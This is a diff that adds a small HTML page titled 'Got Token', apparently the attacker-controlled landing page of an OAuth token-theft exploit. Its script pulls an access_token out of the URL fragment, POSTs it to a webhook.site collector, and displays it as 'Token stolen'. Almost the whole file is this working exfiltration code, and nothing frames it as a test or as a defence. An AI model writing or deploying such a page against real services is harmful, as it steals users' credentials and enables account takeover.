@@ -1,0 +1,24 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Got Token</title></head>
+<body>
+  <p>Sending token to attacker…</p>
+  <script>
+    // Extract access_token from URL fragment
+    const params = new URLSearchParams(location.hash.slice(1));
+    const token = params.get('access_token');
+    if (!token) {
+      document.body.textContent = 'No token found.';
+    } else {
+      // 1) POST it to your collector
+      fetch('https://webhook.site/340bffcf-cf72-4d76-81b7-1ed01af77c42/collect', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({access_token: token})
+      });
+      // 2) Show it on screen
+      document.body.innerHTML = '<pre>Token stolen:\n' + token + '</pre>';
+    }
+  </script>
+</body>
+</html>
